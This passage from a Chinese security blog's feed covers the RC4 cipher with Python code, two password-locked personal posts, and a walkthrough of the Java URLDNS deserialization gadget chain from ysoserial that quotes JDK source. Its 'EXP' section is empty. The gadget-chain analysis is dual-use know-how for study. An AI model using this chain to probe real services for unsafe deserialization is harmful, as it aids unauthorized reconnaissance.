    <content type="html"><![CDATA[<p>hw摸鱼，闲的没啥事干，把RC4的加解密原理写一遍吧，明天干别的东西。（hw期间电脑装了dlp，，就不截图了）</p><p>RC4，对称加密算法，流加密，秘钥长度可变。RC4 算法广泛应用于 SSL/TLS 协议和 WEP/WPA 协议。</p><p>RC4加解密时依次以字节流的方式加解密明文中的每一个字节。</p><h1 id="rc4">RC4</h1><p>RC4中的一些变量：</p><ul><li>密钥流：与明文长度相等，加密生成的密文也是相同的字节</li><li>状态向量S：长度为256，S[0]~S[255]，每个单元一字节，</li><li>临时向量T：长度为256，每个单元为一字节，如果密钥的长度是256字节，就直接把密钥的值赋给T，否则，轮转地将密钥的每个字节赋给T</li><li>密钥K(Key)：长度为1~256字节(<code>keyLen</code>)，密钥的长度与明文长度、密钥流的长度没有必然关系，通常密钥的长度16字节（128比特）。</li></ul><p>RC4算法步骤：</p><ol type="1"><li>初始化S和T</li><li>初始排列S（前两部分称为KSA）</li><li>产生密钥流（称为PRGA）</li></ol><h2 id="初始化s和t">初始化S和T</h2><p><img src="/2022/07/27/RC4/rc4_s_t.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    self.S.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.keyLen):    </span><br><span class="line">    index = random.randint(<span class="number">0</span>, <span class="number">63</span>)</span><br><span class="line">    self.Key.append(self.charTable[index])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    tmp = self.Key[i % self.keyLen]</span><br><span class="line">    self.T.append(tmp)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;hw摸鱼，闲的没啥事干，把RC4的加解密原理写一遍吧，明天干别的东西。（hw期间电脑装了dlp，，就不截图了）&lt;/p&gt;
&lt;p&gt;RC4，对称加密算法，流加密，秘钥长度可变。RC4 算法广泛应用于 SSL/TLS 协议和 WEP/WPA 协议。&lt;/p&gt;
&lt;p&gt;RC4加解密时</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Crypto" scheme="https://ghostasky.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>HW日记</title>
    <link href="https://ghostasky.github.io/2022/07/25/2022-hw/"/>
    <id>https://ghostasky.github.io/2022/07/25/2022-hw/</id>
    <published>2022-07-24T16:00:00.000Z</published>
    <updated>2022-08-01T14:02:21.364Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="867923ac1d685ae7f808f440d71fee0469f1e6d31dc79249bfdee7cd682e71c7">305e8718864ef4d8feb4c216f8ddc50ec8fe1bb4cf58847815d62ea2dddc969ae775573b5ecc4d78789c320fb0ee570dd41a282a91f4fa580847627bd9f0d6872bee20905076dc1dba19289da72b1a37417fa04d61b69651c77728b877fec037cfd1719f3a13ac13a219ee3c0e00c4e609c8cf432ab18c1a8e1c396acb8b6091161699862dd4f6509740b036303c679100d8e36585d7560d3ffac1bd1b9e82aa0c2727a02eee8f47212b5c1ad62b76343a7e4598f1736dae13bca802f6522d4b2040cb7e2fefe3af080d9fa7f629bef93b63ecdfb1fe6f8700e62cc88106d9b11fb8af451686ffa52bb8aa393558bb89b80d473bf98f5b0812d110a8167010104d58f3c5df473833734778e1ef273e46651a8c207f33e2231ea49277ee82001ab3ed0a4de79c906305da5fc6931f0ebc43c39f7c0f1df4942e67ab7a8e776394f247000aea9a96b75d9dea10a5000119945d4dba68e96ddf94920761ce0b814617041319368490e8cdea5d8c7b91f2680fc1b88a36ed1c77164026393f9db2579872c346a30f950a92e7ae09a6e4e9776c93f137d5d6a9aa81994a613321b991a87908d698312f632d27c946e83f272110b42d2a0457ed5c6b89dad46beca02f04ba03ea06561e261240028e0f1370daf3d8322daaa3d0bd3df47092110026c2d33e799b8ab325faed0e20c53a03e48887bdec0c47713114a1723c74915343587907e637e14c2d42bc28c2f0a287acbb218098d6abecc7dd6932a3253f32ed248754d4ecb2707c258d747ff90e89e9b50488b9a99c87d2a226fc72c773cd2131d9c600f460de8a4758ec7548354a3e99ce778650dda04aeeb0cf0d07719b3428d87d3b38e80a58811e80488410e4d6c35bea495ace0340786d6b7b03084599fd8bc799c23eb384e18a91a2df09b23678a8e6c89c8c01fcb468345dac0259cbb59e86ae97b08a7e1d92fb7dcb50ede15c180954de6abd357d6a984f5f79daef0a77e0d84f1c23d912176e1a4af1f17c39ae0bfd22c53da70650fd51e687857996036ee31f26ef5884e6343ff3efe33ae487e5aca563d07325da57eaee2654758de02b256fd1379967ca7e42bae2c9d2635a3eec3dbfab80aef861be2276251d40a86648b4d92b0ef236c67eca6856a359d296fd00f5e57195b921e283d8b06762da07133d64151b9ae27812d84c7e4c2f04beded852d770dcc1b826734bc8044fc5f2ceec07055b0bfc06b62c4521815f85139f96c0c67c697f0888db1c375a6433b0a6b1861d10c55f9370407a5715d52fe00247a6bf1c1ba1146cfcdab01407d41f984ab4d889bd469057c99f4744fb22ddb7b6c6aa12f6120ad8c208a96a169d4298122aa6429cf252110a5a34928cc6f636480c85248b6e16ef283b696f12c06578a55d431132289ab253d104c529d16800189aba3e64bbf00945c7a66491e7ecb9db338ea01b08b94759a92808824178fc4779f22625254db690204403417e328c3d0a50250d7259f9c47679d330cfb23a750d7c1d7994075fae31f87997cfdc058050ef709d6b20e7b27e2d0c8ea4329367185c2425602d529d4e421396fa6f5cbca1b1e5d581c1a630016def6e6139c6011ad1fe1a7fe977f0eaec985a149b8cd40544420ce5da07f93d9a6af42832eb430fa8182acde08ea68f7466fc0bd1f4147693c9bba1e0ff88ab16fcff700ebb52fd03f091a57a059e5986928883973b8a98e23b57976c2f4e9153620f22861e23ae9f8257c9807150d144f861a974d9275f8b19ccd1e9bd0074732736a627bfce79272cf68f12eadb0a653f0e2b0d5f37ebbf07d4281658b5ca71e501a64f7e5132f75510abe0bebd691b6b09c218c9cceb161fc60eb0ef3df8725d6eda088b2baef5aae15f4d912fb935e16f750a534a3b279ac527481bb008bcc4fe087d052924a2742fb2b8dcd5912e8aaa2500b282c9383c56afd31af3c1bcf8bf55bbc5b58475193f344bd59d960a24175f704e94dccd919e6c20fa5aae6328d90c91d34e6439b3c2ed7dff7252ff0af22d93ba31d8f5ff4c52ecd34d9e4f2a66b7893f4ea62e82fc235d1928ad061357d32914b3c4a6eca192905dae5c1f6e298cc5f9fbd36956e4798b0ce7e022803d195040772275eb8acf9b95bbfea66bb27f7b524f33545a79d1f935860f23d46a4e931f4457549c5466c3d658180ad39df395a11176e527226a3ef40e49e8981edf8a28e317549ce4f80237f2ec6ef96ae65d48af888f68894e5b6bc8ae64e2f3868f5e59ba41ee3cb1ff1de3009f6a31a8153255d02ffe92931a5e1e6035b9b0216307979231c1867c4d7547e8b4adc67f467d610856af263bfd16dbd6134f97d96ea25d8b2d2f32355a35c56c29d6418f8fc978812ca897d3a56f1fdbc82ba323202d4db928fad7a20e79f10b54df2941f7699b59f662b51b16ff77fe2f406cb215ca8325f6698607e82a8345aa5d3e6a52e263230d0914546d269b210a4ab6c68111ca38e06ac8cdba1b04fe3682af7a9d1a30e088b4bc9cd49989e9b5699c3090dd2da7b1b5c329c022db55e196af67f0a506cfa66f3819435d3f7294535dacd48af898a6ef83786a78454212756260a56ebe1d88ab04f49229f0669d443073944a423e2a6bb831cee556e982faaa4b72d42c511b617361e5a7c934aaf92943cf14e8cc1d8fb35b50837368bc51b56d403d87f69bfc1f9d914db53283a984ef24e64bc80c330b09014928fc9f9e7a3f7bc3bc6bbc4faa684c3618ca6af6befa3e61e445829becca4e45995a318ddf318a68c21772c45d2a97c3531fd03413f95225dc74b78cbdfcc8db2b41a4296b2d394fe50791ef2c715b9b7634b3757efa2bb69d1101eb3eaba8998632867d170a2b545690242f6365cf2b382242fbe602d8f6322374e04b3e0864baa32d0f234bfea1615ee8a9118cc0efb674a14f0c583e452d53f94a8759578f5ec6f174cd5277c53d9577192e4c29465510c8bbbad22020c96826a92cf595b5ee41ddbfde7a4c4198c1c62e697d32ad682bdf10d445772a8e08769f32ae7f55063693bd97177790e776d812277663bb1d058462a2f963231f6c45551fa82e44b4b54c3e5bb1212a9b7d2bb30a4dfcc313fdc8152c4761d7ad41f8da075568427a4927f856b2c4cf145070a893d1f9f42399586f33a63ba7cb420255361f74d4e2ba976c92b30a491fa4b627ee1f8d605453a045a44b55be8c4ad0ea3a2648e038257cf8400dcc6e6b28dddb80a305563fa9b147e1a987597e5547cf9edb8b62b31d584caf5f6ac55233ec7248f8c6fab44702b96289d3e746a9d4b339fc1aa687f6f9d515c9bd6635f5a49423446546a6e26283f18dab07a7c43123f4889c641d2c0b822c3bd0bc7fda7f55fb6f7b0b642aae56ed77785f9c56e91757d797435942253b2d64dd82343fb173663f6e0adbe86c1a577597f53fe6911a559ec48cad6af922c8ad9b139998dcb8c73fd10e67b4a0689a34645ec3777f8d6ef070ecfa1102f56034fc831e88a766ce6159672dd4d9f1c46a67026c2cbd565d40329069ac8589ce4a61bec9a7a5e43c762a225a80a212245055d6ef9990401640f844d6f0bf719b1fe54839cbddaeec81a80bccc362b32f110e5f66cee35c3f76cbb7a05c3094406332d5a73a924ccf39ad4b165d8353781b33d4086f05c0e6ee4cb898f281c62ae8fb437cfcd8ef5a70a53dd695f10764b0e7c9c3634b3e1d39275ed7257e076bcfb7be80c53389b0a89135f416b69e28172924e582255cae17620517aa85ef5fcd2bc27261f51e019a49f06debfd4fc4cbb00468c4458f803887fba2a9f48e7629020bbd50431c3894be8c348bac229149f9bcee380f1a9f26b4d2956d994e58e32eebdf9a2f454360692abd9e52cf1fb0cdd839264ba32977d57e5352c01ddd4f80d35272a29fbf394dcb93fe7aff20c4eca1c052bdfedf39b5cfdbc0e6c1efa791b2af0ba3a370f7c47cdde97ae249918a8572c5315e796f080f06cafc3c535750a0885808150340472acd44ae441ff29b03323306fc04798683174475db51ec77218440d15bcb1dbb3b6db7fb78583dafa32f9f7183e8609f992d9f7b16e6a48c43d1c5e813f0759e3e6f4783e5252080d0388a79a4fca19cc108923e8deb284e72443a1f15bd9cf3b00c49e611485f3812e81065e02cd823cc5d23277beca3b75c477cdca1cb7b4b70b719ac175df9fdc997cd00ecdb452192eaf07da96e824b0cc747493ec20c2e7f897bbc441b65e3a920a249b8c7391a886e8da6c769d1d250c266a23db51e4e8fe575bb16d939a22426f357ec3a7c964f3a13e4dcc8677c30a81e4d14a9f59bf1f621608129a7283e9e7034c1cfe432ef72431c84fde64adead3a4bc915934b4d5c0f6df02214e64fbcb11715a5285b193f70d40dcfb04187d272d47c4379bee531f87272427fb532607feb6b58b3b245cd57e6dfc446a097f8efc503d46139b6ce24a88cbeffb759864fbc26fdeb8665c67ededb7b54a04a3ad5c589714e2d4c05bb338b5223d1b5a8caee02af1196196c99eb95879bd1b51530b48d3f85559c8f748e35545c9384e1985ee40fd68e2b54f53216693fe1f38c035d9b5a7b59a91919c8888cce21ba5766f363a7f6eaee188a82a6232dd8335889f86611fdce17010c714104e45b7c6c9e19b8a6c5b5f30d0e605625cedc59171c2e09cf1c1842570f07033ab1765a87af3ed8d2afae75d02581def236e1467f4d8265d56d98168a196ea46bb3f08420a50a0b8d8417c8d758375d4785df8ba3129b8c3aa962d4df43a159b3fe33098e705bf606dde735c6cccb5f5e90e0c325267aca69a2ac4666c91ea5a5f808215fd9f73e2aede37a5eda278621b2ea621bbb8dc5f2e3ecd236c1b83f3f702acc9bde4f0286880f82c32072782044e5239fc86c53149d3d0032712616ea78f5f8df0239a0a9e5248092774a829345f6a67465f03e2399954ee2ede853e63fb4c2d53ed9b54090f3e8c8026cef49492b116208eca64ea70897692a82928113ac360aeb5f40765b3e1e14961d47b233494d4a101d704553d65f1f77148d6e45aaac59724d2fdd618ec8e8d2a9ac9606f1fe80548023c2bad43f716614afe79475882e1f7234fc8b8d19858ef58a5655bcfa12d6f332df1a546c4d9d63d5f1a50a8737e176ab3037f18a77080b8cc35829f4a74a768bcd7ee99d5e84e8f82f224d0b33633f69fd12c0ae2bbb2f1cdf4fbbfceca9da7885ac1b4e5c71df49ac416c66f794d27c61af151b8d01d0e5910f731b2b8e1278267d524357324482a3d47cee69b5cd3cf76f3e15568905ecc3db8091feb1b8635a15c6aa2e194bd1c152bc7b72b8f364d672ec073d8d53505074bebc6dff68c4e6cf98b55ee775f97988ce8dbc67a7f7f5d91a4142f79ec53ebdc87a09a047a47212088873b36c811f267d5c2dd838c63ebff899736d42d1aaf6028fc37d85e8dca7656073f7099934</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
    <category term="Life" scheme="https://ghostasky.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>java_URL链分析</title>
    <link href="https://ghostasky.github.io/2022/07/22/Javasec-URL/"/>
    <id>https://ghostasky.github.io/2022/07/22/Javasec-URL/</id>
    <published>2022-07-21T16:00:00.000Z</published>
    <updated>2022-07-23T11:15:34.440Z</updated>
    
    <content type="html"><![CDATA[<p>java安全的东西在github仓库里写了一点，正好放假了，在博客里再重新写一遍，，感觉忘的差不多了。</p><p>[toc]</p><h1 id="urldns">URLDNS</h1><blockquote><p><code>URLDNS</code>为<code>ysoserial</code>的一个利用链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p></blockquote><p>整个URLDNS的链，首先反序列化出发readObject()：</p><ol type="1"><li><code>HashMap-&gt;readObject()</code></li><li><code>HashMap-&gt;hash(kay)</code></li><li><code>URL-&gt;hashCode()</code></li><li><code>URLStreamHandler-&gt;hashCode()</code></li><li><code>URLStreamHandler-&gt;getHostAddress()</code></li><li><code>InetAddress-&gt;getByName(host)</code></li></ol><h1 id="分析">分析</h1><p><code>ysoserial</code>执行时会调用某个类的<code>getObject</code>方法：</p><p><img src="/2022/07/22/Javasec-URL/image-20220722133055369.png"></p><p>看下<code>Hashmap</code>的<code>readObject</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reconstitute the &#123;<span class="doctag">@code</span> HashMap&#125; instance from a stream (i.e.,</span></span><br><span class="line"><span class="comment"> * deserialize it).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在最后<code>putVal</code>的时候计算了<code>key</code>的hash值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了<code>hashCode()</code>方法，其中key为<code>URL</code>对象，调用的是<code>java.net.URL</code>中的<code>hashcode</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>handler</code>是<code>URLStreamHandler</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The URLStreamHandler for this URL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure><p>继续跟<code>URLStreamHandler</code>的<code>hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    String file = u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    String ref = u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中调用了<code>getHostAddress()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的getByName为根据主机名查找IP，就是一次DNS查询，后面的就没必要跟了。</p><h1 id="exp">EXP</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;java安全的东西在github仓库里写了一点，正好放假了，在博客里再重新写一遍，，感觉忘的差不多了。&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;urldns&quot;&gt;URLDNS&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;URLDNS&lt;/code&gt;为</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Java" scheme="https://ghostasky.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>关于读研or就业，还有理想</title>
    <link href="https://ghostasky.github.io/2022/07/12/2022-7-12/"/>
    <id>https://ghostasky.github.io/2022/07/12/2022-7-12/</id>
    <published>2022-07-11T16:00:00.000Z</published>
    <updated>2022-07-12T08:44:38.283Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="016091578614a03bb10d261f8a2c66c806d460deb911392349f22c16b878ff43">305e8718864ef4d8feb4c216f8ddc50ea5a0344288f76f4e56571cfbee997849e131f2d392952bf9bc01921719edb06b6fb93948225e68db14e2b07a5c2f5546a641803d388e5bfc015e1a9513fbcb319cfe7f296f6308635ece84245f9a9adc08006bee06d9494e38802d237dc6ed7d76c1b80a91f98ff7ee7193fee05ec566e43fd5b99ed62d35be02fd8557cf87408fcc2bdfd621784c9ca78f330785d1b2e62c92c9152c7caa41d2a7ae0685b68d27fb1bda42f19923845e4cff2d5423d7cf18790cc3032ab83e1127ca93bc15e26dab369babec498144a4892e1b5b652af115b6ad6841c65ddb15d73136baa3f161bbae40ecfd93f8c11714b3ad916d10897ad3917ebbb439efc037a48b20a32dc249abb1691d93c94e684b10a00c3be95471ca791961a88bf6cebf06df47bbe2c52ea025aaff71976b959a627684e31ca7a91ee43fc23f7eacc17c339d8998ace369bc9b0d1e7d113ac077c1b8b60a98257283cdaf3d1fdb1d205e600b519c5057b4cea11e0ada6b21628b70d4ed4f8de3f532d31389ecbf74fd7db99123978c870b5af00a05092e44fb10649d9c4489780b63ee3a463674265599751b636ffa3acb1c6c294ced3c9a1f9480e53398f78955d36e527e956c97027a36a1abefec052c200f2e0c39ac0a2c398a72f41b7643fb714c6b99275bf6e71df53c9a3e95b8d6429bfe6b0a040eacae99a05adfe121bd437d570648b8f263655881dece2d98d4292838f64b5f3f0b4e8ffccbcd8970b8ab75689aef575e8fba8df53a8e06bb59e7438aa41e65f6fb074a5dee2740d72725507f6402bde20c5d9268aaa4ad42cbdb9ab065e34e7904dc2ebfef333b087b73487d547b90311ff92725a055771f89e56cdb42ee39a17d7cb7f2b681de0751d820299de2015d42246098fdedc30a